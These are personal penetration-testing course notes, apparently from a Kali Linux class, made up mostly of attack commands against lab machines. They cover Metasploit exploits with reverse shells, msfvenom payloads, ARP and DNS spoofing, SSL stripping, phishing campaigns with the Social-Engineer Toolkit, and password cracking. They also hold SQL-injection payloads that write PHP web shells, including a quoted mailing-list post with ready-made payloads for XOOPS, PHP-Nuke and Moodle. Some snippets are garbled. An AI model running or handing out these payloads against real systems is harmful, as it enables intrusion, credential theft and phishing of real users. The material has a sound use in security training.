@@ -1,0 +1,2078 @@
+KALI Linux - Cybrary.IT
+=======================
+
+Programming
+===========
+
+ShellScript em Bash
+
+# vi ping.sh
+
+#!/bin/bash
+
+if [ "$1" == "" ]
+then
+	echo "Use: ./ping.sh [network]"
+	echo "Exemplo: ./ping.sh 192.168.5"
+else
+	
+fi
+
+for IP in `seq 1 254`; do
+	ping -c 1  "$1"."$IP" | grep "64 bytes" | cut -d " " -f 4 | sed 's/.$//';
+done
+
+
+# chmod 750 ping.sh
+# ./ping.sh 192.168.5
+
+# vi test_port.sh
+
+#!/usr/bin/python
+import socket
+
+ip = raw_input("Enter the IP address: ")
+port = input("Enter the port number: ")
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+if sock.connect_ex((ip, port)):
+	print "Port", port, "is closed"
+else:
+	print "Port, port, "is open"
+
+# chmod 750 test_port.py
+# ./test_port.py
+
+# vi 
+
+#include stdio.h>
+
+int main(int argc, char *argv[])
+{
+	if (argc < 2)
+	{
+		printf("%s\n", "Pass your name as an arguement");
+	}
+	else
+	{
+		printf("Hello %s\n", argv[1]);
+		return 0;
+	}
+}
+
+Metasploit-Framework
+====================
+# cd /usr/share/metasploit-framework/modules/
+
+# ls exploits <-- estão os exploits separados por plataformas
+
+http://www.exploit-db.com
+Windows XP = 192.168.1.20
+Kali Linux = 192.168.1.10
+
+MSFConsole
+----------
+# service postgresql start
+# service metasploit start
+# msfupdate -f
+# msfconsole
+
+msf> search ms08-067
+msf> info exploit/windows/smb/ms08_067_netapi
+msf> use exploit/windows/smb/ms08_067_netapi
+msf> show options
+msf> set RHOST 192.168.1.20
+msf> show targets
+msf> show payloads
+msf> set PAYLOAD windows/shell/bind_tcp
+msf> show options
+msf> set LPORT 8080
+msf> exploit
+c:\WINDOWS\Sytem32>
+^Z
+Background session 1? [y/N] y
+msf> session -l
+msf> sessiont -i 1
+c:\WINDOWS\Sytem32>
+
+Auxiliary Module
+----------------
+
+# msfconsole
+
+msf> search ms08-067
+msf> info exploit/windows/smb/ms08_067_netapi
+msf> use exploit/windows/smb/ms08_067_netapi
+msf> set RHOST 192.168.1.20
+msf> set PAYLOAD windows/shell/bind_tcp
+msf> set LPORT 8080
+msf> show options
+
+SMBPIPE  BROWSER  <-----------------------------+
+						|
+msf> use auxiliary/scanner/smb/pipe_auditor	|
+msf> show options				|
+msf> set RHOSTS 192.168.1.20			|
+msf> exploit					|
+Pipes \browser ---------------------------------+
+
+MSFCli
+------
+
+# msfcli -h
+# msfcli exploit/windows/smb/ms08_067_netapi P <-- mostra os Payloads disponiveis para esse exploit
+# msfcli exploit/windows/smb/ms08_067_netapi payload=windows/shell/reverse_tcp O <-- mostras as opções para o exploit e para o payload
+
+# msfcli exploit/windows/smb/ms08_067_netapi payload=windows/shell/reverse_tcp RHOST=192.168.1.20 LHOST=192.168.1.10 LPORT=8080 E <-- Executa o exploit
+
+MSFVenom
+--------
+# cd /usr/share/metasploit-framework/
+#ls
+--> msfencode
+# cd
+
+# msfvenom -h
+# msfvenom -p windows/meterpreter/reverse_tcp -o <-- -p payload e -o options
+# msfvenom --help-formats
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=8080 -f exe > meterpreter.exe <-- -f formato e direciona para um arquivo a ser criado, deve ser enviado para a vitima e antes de ser executado deve  ser criado um handler
+
+# msfconsole
+
+msf> use exploit/multi/handler
+msf> set PAYLOAD windows/meterpreter/reverse_tcp
+msf> set LHOST 192.168.1.10
+msf> set LPORT 8080
+msf> exploit
+
+Execute na vitima que será explorada
+
+meterpreter> getuid
+meterpreter> hashdump
+meterpreter> help
+
+Information Gathering
+=====================
+
+DNS
+---
+# whois www.how2security.com.br
+
+# nslookup www.how2security.com.br
+
+# nslookup
+> set type=mx
+> how2security.com.br
+> set type=ns
+> how2security.com.br
+> exit
+# host -t ns how2seucirty.com.br
+# host -l how2security.com.br ns01.how2security.com.br \_ transfer zone
+# host -l how2security.com.br ns02.how2security.com.br /
+
+root@kali-well:~# host -t ns zonetransfer.me
+zonetransfer.me name server nsztm2.digi.ninja.
+zonetransfer.me name server nsztm1.digi.ninja.
+root@kali-well:~# host -l zonetransfer.me nsztm2.digi.ninja
+Using domain server:
+Name: nsztm2.digi.ninja
+Address: 167.88.42.94#53
+Aliases: 
+
+zonetransfer.me has address 217.147.180.162
+zonetransfer.me name server nsztm1.digi.ninja.
+zonetransfer.me name server nsztm2.digi.ninja.
+164.180.147.217.IN-ADDR.ARPA.zonetransfer.me domain name pointer www.zonetransfer.me.
+asfdbbox.zonetransfer.me has address 127.0.0.1
+canberra-office.zonetransfer.me has address 202.14.81.230
+dc-office.zonetransfer.me has address 143.228.181.132
+deadbeef.zonetransfer.me has IPv6 address dead:beaf::
+email.zonetransfer.me has address 74.125.206.26
+internal.zonetransfer.me name server intns1.zonetransfer.me.
+internal.zonetransfer.me name server intns2.zonetransfer.me.
+intns1.zonetransfer.me has address 167.88.42.94
+intns2.zonetransfer.me has address 167.88.42.94
+new.zonetransfer.me has address 217.147.177.157
+office.zonetransfer.me has address 4.23.39.254
+ipv6actnow.org.zonetransfer.me has IPv6 address 2001:67c:2e8:11::c100:1332
+owa.zonetransfer.me has address 207.46.197.32
+alltcpportsopen.firewall.test.zonetransfer.me has address 127.0.0.1
+vpn.zonetransfer.me has address 174.36.59.154
+www.zonetransfer.me has address 217.147.180.162
+root@kali-well:~# host -l zonetransfer.me nsztm1.digi.ninja
+Using domain server:
+Name: nsztm1.digi.ninja
+Address: 81.4.108.41#53
+Aliases: 
+
+zonetransfer.me has address 217.147.180.162
+zonetransfer.me name server nsztm1.digi.ninja.
+zonetransfer.me name server nsztm2.digi.ninja.
+164.180.147.217.IN-ADDR.ARPA.zonetransfer.me domain name pointer www.zonetransfer.me.
+asfdbbox.zonetransfer.me has address 127.0.0.1
+canberra-office.zonetransfer.me has address 202.14.81.230
+dc-office.zonetransfer.me has address 143.228.181.132
+deadbeef.zonetransfer.me has IPv6 address dead:beaf::
+email.zonetransfer.me has address 74.125.206.26
+internal.zonetransfer.me name server intns1.zonetransfer.me.
+internal.zonetransfer.me name server intns2.zonetransfer.me.
+intns1.zonetransfer.me has address 167.88.42.94
+intns2.zonetransfer.me has address 167.88.42.94
+office.zonetransfer.me has address 4.23.39.254
+ipv6actnow.org.zonetransfer.me has IPv6 address 2001:67c:2e8:11::c100:1332
+owa.zonetransfer.me has address 207.46.197.32
+alltcpportsopen.firewall.test.zonetransfer.me has address 127.0.0.1
+vpn.zonetransfer.me has address 174.36.59.154
+www.zonetransfer.me has address 217.147.180.162
+root@kali-well:~# 
+
+# fierce -dns microsoft.com <-- anlisa o DNS e faz força bruta nas consultas
+
+E-Mail e Maltego
+----------------
+# theharvester -h
+# theharvester -d cisco.com -l 500 -b all
+
+site http://www.netcraft.com
+
+# maltego
+Registri-se e preencha o formulário.
+
+Expanda Infrastructure
+arraste o Domain para o centro, coloque o dominio how2security.com.br
+clique com o botão direito do mouse em domain aponte para ... transform -> all transforms
+
+SHODAN (Sentient Hyper-Optimized Data Access Network)
+
+https://www.shodan.io/
+
+Search webscanxp
+
+Recon-ng
+--------
+# recon-ng
+recon-ng> show modules
+recon-ng> use recon/contacts-xreds/haveibeerqwned
+recon-ng> set source goog
+
+estude essa ferramenta
+
+depois ele passou google hacking
+
+NMAP PortScanning
+-----------------
+
+# nc 192.168.1.20 80
+GET / HTTP/1.0 \n\n
+
+# nc -v 192.168.1.20 80
+.... (http) open
+
+# nc -v 192.168.1.20 81
+..... connect refused
+
+
+# nmap -sS 192.168.1.10 192.168.1.20 -oA classscan
+# nmap -sS 192.168.1.20 -p 3232
+# nmap -sS 192.168.1.20 -oA classudp
+# nmap -sS 192.168.1.20 -oA classversion
+# nmap -sV -p 3232 192.168.1.20
+
+
+Vulnerability Scanning
+======================
+
+NMAP
+----
+ls /usr/share/nmap/scripts/ <-- Scripts
+
+# nmap --script-help default
+
+root@kali-well:~# nmap --script-help smb-check-vulns
+
+root@kali-well:~# nmap --script-help nfs-ls
+
+root@kali-well:~# nmap -sC 192.168.1.129 -oA script-output
+
+Starting Nmap 6.49BETA5 ( https://nmap.org ) at 2015-11-28 00:03 BRST
+Nmap scan report for 192.168.1.129
+Host is up (0.00030s latency).
+Not shown: 977 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+22/tcp   open  ssh
+| ssh-hostkey: 
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+23/tcp   open  telnet
+25/tcp   open  smtp
+|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+53/tcp   open  domain
+| dns-nsid: 
+|_  bind.version: 9.4.2
+80/tcp   open  http
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Metasploitable2 - Linux
+111/tcp  open  rpcbind
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      48317/udp  mountd
+|   100005  1,2,3      52299/tcp  mountd
+|   100021  1,3,4      55758/tcp  nlockmgr
+|   100021  1,3,4      58201/udp  nlockmgr
+|   100024  1          49034/udp  status
+|_  100024  1          52043/tcp  status
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+512/tcp  open  exec
+513/tcp  open  login
+514/tcp  open  shell
+1099/tcp open  java-rmi
+1524/tcp open  ingreslock
+2049/tcp open  nfs <----------------------------------------------------- vamos rodar o script para listar em seguida
+2121/tcp open  ccproxy-ftp
+3306/tcp open  mysql
+| mysql-info: 
+|   Protocol: 53
+|   Version: .0.51a-3ubuntu5
+|   Thread ID: 10
+|   Capabilities flags: 43564
+|   Some Capabilities: Speaks41ProtocolNew, Support41Auth, SupportsTransactions, SwitchToSSLAfterHandshake, ConnectWithDatabase, LongColumnFlag, SupportsCompression
+|   Status: Autocommit
+|_  Salt: YceQFI}]65IM({W#Fu=n
+5432/tcp open  postgresql
+5900/tcp open  vnc
+| vnc-info: 
+|   Protocol version: 3.3
+|   Security types: 
+|_    Unknown security type (33554432)
+6000/tcp open  X11
+6667/tcp open  irc
+| irc-info: 
+|   users: 1
+|   servers: 1
+|   lusers: 1
+|   lservers: 0
+|   server: irc.Metasploitable.LAN
+|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
+|   uptime: 0 days, 10:24:33
+|   source ident: nmap
+|   source host: 4A76BB60.78DED367.FFFA6D49.IP
+|_  error: Closing Link: bcbkdogkf[192.168.1.126] (Quit: bcbkdogkf)
+8009/tcp open  ajp13
+|_ajp-methods: Failed to get a valid response for the OPTION request
+8180/tcp open  unknown
+|_http-favicon: Apache Tomcat
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Apache Tomcat/5.5
+MAC Address: 00:0C:29:A3:93:B1 (VMware)
+
+Host script results:
+|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   NetBIOS computer name: 
+|   Workgroup: WORKGROUP
+|_  System time: 2015-11-27T20:53:38-05:00
+
+Nmap done: 1 IP address (1 host up) scanned in 16.81 seconds
+root@kali-well:~# 
+
+
+root@kali-well:~# nmap --script=nfs-ls 192.168.1.129
+
+| nfs-ls: 
+|   Arguments:
+|     maxfiles: 10 (file listing output limited)
+|   
+|   NFS Export: /
+|   NFS Access: Read Lookup Modify Extend Delete NoExecute
+|     PERMISSION  UID  GID  SIZE   MODIFICATION TIME    FILENAME
+|     drwxr-xr-x  0    0    4096   2012-05-20T18:36:12  /
+|     drwxr-xr-x  0    0    4096   2012-05-14T03:35:33  bin
+|     drwxr-xr-x  0    0    4096   2010-04-16T06:16:02  home
+|     drwxr-xr-x  0    0    4096   2010-03-16T22:57:40  initrd
+|     lrwxrwxrwx  0    0    32     2010-04-28T20:26:18  initrd.img
+|     drwxr-xr-x  0    0    4096   2012-05-14T03:35:22  lib
+|     drwx------  0    0    16384  2010-03-16T22:55:15  lost+found
+|     drwxr-xr-x  0    0    4096   2010-03-16T22:55:52  media
+|     drwxr-xr-x  0    0    4096   2010-04-28T20:16:56  mnt
+|     drwxr-xr-x  0    0    4096   2012-05-14T01:54:53  sbin
+|_    drwxr-xr-x  0    0    4096   2010-04-28T04:06:37  usr
+
+
+Host script results:
+|_nfs-ls: ERROR: Script execution failed (use -d to debug)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds
+root@kali-well:~# 
+
+
+root@kali-well:~# nikto  -h http://192.168.1.129
+
+https://www.exploit-db.com/exploits/12582/ ZERVIT
+
+Terminal 1
+wireshark
+
+Terminal 2
+root@kali-well:~# arpspoof -i eth0 -t 192.168.1.2 192.168.1.130
+
+Terminal 3
+root@kali-well:~# arpspoof -i eth0 -t 192.168.1.130 192.168.1.2
+
+Terminal 4
+root@kali-well:~vi hosts.txt 
+root@kali-well:~# dnsspoof -i eth0 -f /root/hosts.txt 
+dnsspoof: listening on eth0 [udp dst port 53 and not src 192.168.1.126]
+192.168.1.130.1045 > 200.204.0.10.53:  28639+ A? www.gmail.com
+^Croot@kali-well:~# 
+
+Terminal 4
+wireshark
+
+MSF
+---
+# echo "192.168.1.129" > hosts_alive.txt
+# echo "192.168.1.130" >> host_alive.txt
+
+# msfconsole
+msf> use auxiliary/scanner/ftp/anonymous
+msf> show options
+msf> set RHOSTS file:/root/hosts_alive.txt
+msf> run
+msf> use exploit/windows/smb/ms08_067_netapi
+msf> set RHOST 192.167.1.129
+msf> check
+the target is vulnerable
+
+Web App
+-------
+
+# mysql -h 192.168.1.129
+ERROR
+Google --> credential wampp
+
+# cadaver http://192.168.1.129/webdav
+Username: wampp
+Password: wampp
+dav> exit
+
+# dirbuster
+# nikto -h http://site.alvo.com
+
+Directory Transversals
+----------------------
+Google -> Zervit 0.4
+
+buffer overflow
+http://www.exploit-db.com/exploits/12582/
+
+http://192.168.1.20/index.html?../../../../../boot.ini
+
+# nc 192.168.1.20 25
+VRFY wsilva
+250 Wellington Silva <wellington.silba@>
+VRFY james
+551 User not local
+
+Traffic Capture
+---------------
+# wireshark
+
+ARP Protocol
+------------
+
+# echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# arp
+
+# arpspoof -i eth0 -t 192.168.1.20 192.168.1.1
+# arpspoof -t eth0 -t 192.168.1.1 192.168.1.20
+
+DNS Cache Poisoning
+-------------------
+# echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# arpspoof -i eth0 -t 192.168.1.20 192.168.1.1
+# arpspoof -t eth0 -t 192.168.1.1 192.168.1.20
+
+# echo "127.0.0.1 www.gmail.com" > hosts.txt
+
+# dnsspoof -i eth0 -f /root/hosts.txt
+
+Vá até a máquina vitima e acesse via browser o site
+http://www.gmail.com
+
+Etthercap
+---------
+
+# echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# arpspoof -i eth0 -t 192.168.1.20 192.168.1.1
+# arpspoof -t eth0 -t 192.168.1.1 192.168.1.20
+
+entre no facebook.com e faça um login errado
+
+no wireshark coloque o filtro: http
+
+pare o ataque arpspoof
+
+# etthercap -Ti eth0 -M arp:remote /192.168.1.1/ /192.168.1.20/
+
+no wireshark coloque o filtro: http
+
+entre no facebook.com e faça um login errado
+
+no wireshark coloque o filtro: http
+
+# vi /etc/ettercap/etter.conf
+só olhar as configurações
+
+SSL Stripping - Man in the Middle
+---------------------------------
+
+# echo 1 > /proc/sys/net/ipv4/ip_forward
+# arpspoof -i eth0 -t 192.168.1.20 192.168.1.1
+# arpspoof -t eth0 -t 192.168.1.1 192.168.1.20
+
+# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+# sslstrip -l 8080
+
+Vá na vitima e acesse: http://twitter.com ou http://www.facebook.com
+
+
+Exploitation
+============
+
+SQL Commands
+------------
+
+Exploiting Open phpMyAdmin
+
+http://192.168.1.20/phpmyadmin
+
+select "<?php system($_GET['cmd']); ?>" into outfile"C:\\xampp\\htdocs\shell.php"
+
+http://192.168.1.20/shell.php?cmd=ipconfig
+
+http://192.168.1.20/shell.php?cmd=net user
+http://192.168.1.20/shell.php?cmd=net user well password add/
+
+# atftpd --daemon --bind-address 192.168.1.10 /tmp
+
+http://192.168.1.20/shell.php?cmd=tftp 192.168.1.10 get meterpreter.php C:\\xampp\\htdocs\\meterpreter.php
+http://192.168.1.20/meterpreter.php
+
+msf> use exploit/multi/handler
+msf> search mysql_payload
+msf> set payload windows/meterpreter/reverse_tcp
+msf> set LHOST 192.168.1.10
+msf> set LPORT 8080
+msf> exploit
+
+-=-=-=-=-=-=-=-=-=-=-=- ******** -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+He does it like this:
+{begining of injection} AND 1=0 UNION SELECT 1,1,1,'my code here' INTO
+OUTFILE '/www/htdocs/shell.php/'/*
+
+"0' UNION SELECT '0' , '<? system(\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0
+INTO \
+OUTFILE '$outfile"
+
+go to http://www.site.com/path2phpshell/shell.php?cpc=ls to see results
+
+olhe o site: http://seclists.org/pen-test/2007/Dec/75
+
+Writing a phpshell via SQL Injection to a host From: Joseph McCray <joe () learnsecurityonline com>
+Date: Wed, 12 Dec 2007 12:40:11 -0500
+
+Ok guys...
+
+I've really been hitting SQL Injection pretty hard lately. I feel pretty
+comfy with SQL Injection on MSSQL server now, and I'm starting to play
+with with it on MySQL.
+
+Feeling pretty confident on inference based stuff so now I'm working on
+writing a phpshell to a host. I'm really hoping that someone here can
+point me in the right direction to figure this out, and/or provide me
+with some clarification on the specifics of the attack.
+
+The best reference on this type of attack that I've found so far is:
+http://www.webapptest.org/index.php?entry=entry070910-130659
+
+
+He does it like this:
+{begining of injection} AND 1=0 UNION SELECT 1,1,1,'my code here' INTO
+OUTFILE '/www/htdocs/shell.php/'/*
+
+
+I've found a few other exploits that actually use this technique, but
+they don't implement it in the same way. So I'm still not following the
+logic, the methodology - that whatever...dude I don't f*cking know how
+to make this work - it just hasn't clicked for me for some reason.
+
+I'm missing something here....
+
+So the primary conditions where this attack is possible are:
+
+1. mysql user must have the FILE privilege;
+
+2. the operator requires a "quoted" file pathname, so the web
+application should not escape/filter them;
+
+3. httpd and mysql should be installed on the same machine, or (if you
+can) the file will be written on the dbms machine;
+
+4. You need to know the fullpath name of the web root.
+
+===================
+
+1. Ok, FILE privilege - Will you see some sort of permission denied
+error during the attempt? How will I be able to determine this remotely?
+
+2. This one is probably just trial and error (cross your fingers and
+hope I guess) to figure this out.
+
+3. This is pretty common
+
+4. This can be enumerated by reading the errors from your injection.
+
+
+
+Ok let's get to the meat of the attack.
+
+-QUOTE-
+AND 1=0" because in this way I was able to make the first query returns
+0 rows (so no data from the original query will be inserted in
+shell.php). Second : we can notice that in shell.php there are some
+undesired data (1 1 1). To avoid their presence we can use "null" or ''.
+-/QUOTE-
+
+
+Exploits I found that write a phpshell are not using the 1=0. I don't
+understand why. I've posted a few that I've found below. Can someone
+clarify?
+
+Next, I'm really not understanding there zeros before and after the
+actual phpshell page. (e.g. ,0 ,0 ,0 ,0)
+
+How do I know how many of these zeros I need, if at all. Someone told me
+that it had something to do with the number of columns in the table. Can
+someone clarify?
+
+
+
+
+-----------SQL Injection with INTO OUTFILE Notes:------------
+
+######################
+# N-13 Exploit Usage #
+######################
+"0' UNION SELECT '0' , '<? system(\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0
+INTO \
+OUTFILE '$outfile"
+
+go to http://www.site.com/path2phpshell/shell.php?cpc=ls to see results
+
+############
+# Option 1 #
+############
+use mysql;
+DROP TABLE IF EXISTS `temptab`;
+CREATE TABLE temptab (codetab text);
+INSERT INTO temptab (codetab) values ('<?php
+system($_GET["-cmd"]); 
+?><html><head><title>help.php</title></head><onLoad="document.forms[0].elements[-cmd].focus()"><form 
+method=POST><br><input type=TEXT name="-cmd" size=64 value="<?=$cmd?>"><hr><pre><? if($cmd != "") print 
+shell_exec($cmd); ?></pre></form></body></html>');
+SELECT * INTO OUTFILE 'C:/public_html/phpmyadmin/help.php' from temptab;
+DROP TABLE temptab;
+FLUSH LOGS;
+
+############
+# Option 2 #
+############
+1. create a php-file with the following code: <?php
+system($_GET['cmd']); ?>
+
+2. save it as shell.php
+
+3. now you can execute commands by connecting to this file:
+
+http://yourserver.com/shell.php?cmd=[command you want to execute]
+
+########################
+# XOOPS Exploit Method #
+########################
+http://[target]/[path_to_xoops]/modules/wfdownloads/viewcat.php?list=-1'%20or'a'='a'%2 \
+0UNION%20SELECT%200,0,0,'<?php%
+20system($_GET[cmd]);?>',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, \
+0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20INTO%20OUTFILE%
+20'../../www/xoops/uploads/shell.php'%2 \
+0FROM%20fXZtr_wfdownloads_downloads/*
+
+after you can launch commands:
+http://[target]/[path_to_xoops]/uploads/shell.php?cmd=cat%20/etc/passwd
+
+###########################
+# PHP-Nuke Exploit Method #
+###########################
+'UNION SELECT '<?error_reporting(0);?>',0,0,0,0,0,0,0,'<?echo \"Hi
+Master\";ini_set(\"max_execution_time\",0);system(\$_GET[cmd]);die;?>',0
+INTO OUTFILE '".$pathtoWWW.$path."shell.php' FROM nuke_users/*
+
+#########################
+# Moodle Exploit Method #
+#########################
+[1] http://[target]/[path]/course/category.php?id='%20UNION%20SELECT%
+200,'<?
+php%20system($_GET[cmd]);%20?>',0,0,0,0,0,0%20INTO%20DUMPFILE%20'../../w
+ww/moodle/shell.php'%20FROM%20mdl_course_categories/*
+
+[2] http://[target]/[path]/course/info.php?id='UNION%20SELECT%
+200,0,0,0,'<?p
+hp%20system($_GET[cmd]);%20?>',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+,0,0,0,0,0,0,0%20INTO%20DUMPFILE%20'../../www/moodle/shell.php'%20FROM%2
+0mdl_course/*
+
+now in shell.php we have something like:
+
+00000<?php system($_GET[cmd]); ?>000000
+
+so you can launch commands, ex.:
+
+http://[target]/[path]/shell.php?cmd=cat%20config.php
+
+
+##############################
+# Nice Name Crew PHP Shell 1 #
+##############################
+INSERT INTO `test` VALUES (' INSERT INTO shell (codetab) values (''<?
+$cmd=$_REQUEST["-cmd"];\r\n ?><html><head><title>Darkside´s php
+shell</title></head><body bgcolor=#000000 text=#ffffff\r\n
+onLoad="document.forms[0].elements[-cmd].focus()"><form
+method=POST><br><input type=TEXT \r\n name="-cmd" size=64 value="<?=
+$cmd?>" style=background:#000000;color:#ffffff;"><pre><?\r\n if($cmd !
+="") print Shell_Exec($cmd);?></pre></form></body></html>'');\r\n SELECT
+* INTO OUTFILE ''/srv/www/htdocs/tbl_cmd.php''from test;\r\n FLUSH LOGS;
+\r\n');
+
+
+-------------------end of my notes---------------------------------
+
+
+
+I'd really like some help in figuring this one out. There are some
+basics that just aren't clicking for me. Any help would be greatly
+appreciated.
+
+
+-- 
+Joe McCray
+Toll Free:  1-866-892-2132
+Email:      joe () learnsecurityonline com
+Web:        https://www.learnsecurityonline.com
+
+
+Learn Security Online, Inc.
+
+* Security Games        * Simulators
+* Challenge Servers     * Courses
+* Hacking Competitions  * Hacklab Access
+
+"The only thing worse than training good employees and losing them 
+is NOT training your employees and keeping them." 
+
+        - Zig Ziglar
+
+Attachment: signature.asc
+Description: This is a digitally signed message part
+
+  By Date           By Thread  
+Current thread:
+
+    Writing a phpshell via SQL Injection to a host Joseph McCray (Dec 13) 
+
+
+Directory Transversal
+---------------------
+http://192.168.1.20/index.html?../../../../../WINDOWS/repair/sam
+http://192.168.1.20/index.html?../../../../../WINDOWS/repair/systems
+
+na hora de salvar renomer de index.html para o nome e extensão original
+
+Open Source Vulnerability
+-------------------------
+
+msf> serach tikiwiki
+msf> info exploit/unix/webapp/tikiwiki_graph_formula_exec
+
+http://www.osvdb.org/40478
+
+no Google search number vuln OSVDB-ID 40478
+
+acesse o do exploit-db
+
+msf> use exploit/unix/webapp/tikiwiki_graph_formula_exec
+msf> show options
+msf> set RHOST 192.168.1.20
+msf> show payloads
+msf> set payload php/meterpreter/reverse_tcp
+msf> set LHOST 192.168.1.10
+msf> exploit
+
+Use Backdoor to Access FTP Server
+---------------------------------
+# ftp 192.168.1.129
+Name: well
+Password: well
+
+
+# nc 192.168.1.129 6200
+whoami
+cat /etc/shandow
+--=-=-
+copy
+--=-=-
+
+exit
+
+# vi linuxpass.txt
+past
+:wq
+
+msf> use exploit/unix/ftp/vsftpd_234_backdoor
+msf> show payloads
+msf> set payload cmd/unix/interact
+
+Attachiiing to an IP Address
+-----------------------------
+# showmount -e 192.168.1.129
+# mkdir /tmp/geo
+# mount -t nfs -o nolock 192.168.1.129:/export/geo /tmp/geo
+# cd /tmp/geo
+# ls
+# ls -a
+# cd .ssh
+# ls
+# cat authorized_keys
+# cp id_rsa /root/.ssh/
+# cp id_rsa.pub /root/.ssh/
+# ssh-add
+# ssh geo@192.168.1.129
+yes
+$
+
+Password
+========
+
+Online Password Cracking
+------------------------
+# hydra -l admin -P password.txt 192.168.1.20 ftp
+
+-l --> username
+-L --> arquivo de usernames
+-p --> password
+-P --> Wordlist
+
+por ultimo é o protocolo.
+
+Offline Password Cracking
+------------------------
+# vi windows7hashes.txt
+
+# john windows7hashes.txt
+
+# vi password.txt
+password
+Password
+PASSWORD
+p@ssw0rd
+P@ssw0rd
+P@SSW0RD
+
+# john --format=nt --wordlist=password.txt
+# john --show windows7hashes.txt
+
+Using OclGashCat
+----------------
+
+# hashcat --help
+1000 = NTLM
+
+# cd /usr/share/hashcat/rules
+# cd /usr/share/wordlists
+# gunzip rockyou.txt.gz
+# vi windows7hashes.txt
+Administrator:500:çlakpoej3jpiajeoijoqwi3j:lsemf2ij4fowioejri4jofin4oifho:::
+                                               ^
+                                               +--- NTLM
+lsemf2ij4fowioejri4jofin4oifho
+
+:wq
+
+# hashcat -m 1000 windows7hashes.txt -o win7cracked.txt /usr/share/wordlists/rockyou.txt
+# vi win7cracked.txt
+
+
+# hashcat -m 1000 windows7hashes.txt -r /usr/share/hashcat/rules/base64.rule -o win7cracked.txt /usr/share/wordlists/rockyou.txt
+
+# john linuxhashes.txt
+# john linuxhashes.txt --format=sha512crypt --wordlist=/usr/share/wordlist/rockyou.txt
+
+podemos também pegar um hash MD5 e colocar-lo na pesquisa do Google e derrepente alguem já tenha quebrado aquele hash.
+
+# pipal win7cracked.txt
+
+Advanced Exploit
+================
+
+Client Side Attack
+------------------
+# msfconsole
+msf> use exploit/windows/browser/ms10_002_aurora
+msf> show options
+msf> set URLPATH class
+msf> show payloads
+msf> set PAYLOAD windows/meterpreter/reverse_tcp
+msf> set LHOST 192.168.1.10
+msf>  exploit
+[...]
+Local IP: http://192.168.1.10:8080/class
+[...]
+
+msf> jobs
+
+Agora vá no Windows e abra o IE e acesse o link: http://192.168.1.10:8080/class
+
+Volte para o Linux
+
+meterpreter> 
+
+No windows o browser trava se o usuario fechar perdemos nossa conexão. faça o procedimento novamente.
+
+
+meterpreter> ps
+3020 explorer.exe
+meterpreter> migrete 3020
+meterpreter> background
+
+Agora vamos fazer com que a exploração abra um novo processo. outra forma de não derrubarem sua exploração. Faça o procedimento abaixo e acesse link na vitima.
+msf> show advanced
+msf> set PrependMigration true
+msf> jobs
+msf> kill 0
+msf> exploit
+
+msf> session -i 3
+meterpreter> 
+
+feche o browser na vitima e observe que seu shell continua interagindo com o sistema da vitima.
+
+Exploit Java
+------------
+
+msf> use exploit/multi/java_signed_applet
+msf> show options
+msf> set APPLETNAME buldsec
+msf> set urlpath applet
+msf> show payloads
+msf> set target 0
+msf> set payload java/meterpreter/reverse_tcp
+msf> set lhost 192.168.1.10
+msf> exploit
+
+acesse o applet pelo browser da vitima
+
+msf> session -i 4
+meterpreter> sysinfo
+
+
+Social Enginnering
+------------------
+
+# service apache2 start
+# vi /usr/share/set/config/set_config
+APACHE_SERVER=ON alter to APACHE_SERVER=OFF
+
+
+# setoolkit
+no
+y
+set> 1
+set> 1
+set:phishing> 1
+set:payload> 12
+set:payload> 2
+set:payload> 3
+set:payload> 192.168.1.10
+set:payload> 443
+set:phishing> 1
+set:phishing> 1
+set>phishing> 1
+set:phishing> 6
+set..> Send email to: oteb@how2seucity.com.br
+set..> 1
+set..> You gmail email address: linux.etch@gmail.com
+set..> The FROM NANME user will see: Traince helpdesk
+Email password: ********
+Flags this message/s as high priority [yes|no]]: no
+<ENTER>
+set..> Setup a listener [yes|no]: yes
+
+set..> 99
+set> 2
+set:webattack> 1
+set..> IP 192.168.1.10
+set..> URL Clone: http://www.gmail.com
+
+Do you want to attempt to disable apache? [y/n]: y
+
+POSSIBLE USERNAME FOUND: email=linux.etc@gmail.com
+POSSIBLE PASSWORD FIELD: pass=P@ssw0rd
+^C
+
+
+set:webattack> 2
+set..> IP 192.168.1.10
+set..> 3
+
+# vi email.txt
+well@gmail.com
+oteb@gmail.com
+etch.linux@gmail.com
+
+:wq
+
+set> 1
+set> 5
+set:mailer> 2
+set:phishing> Path.. file: /root/email.txt
+set..> 1
+You Email account: linux.etch@gmail.com 
+set..> FROM NAME .. see: TRAINACE HELPDESK
+Email password: ********
+set..> Flag .. priority : no
+set..> Email subject: New Project
+set..> Send email cleantext or html? h or p: h
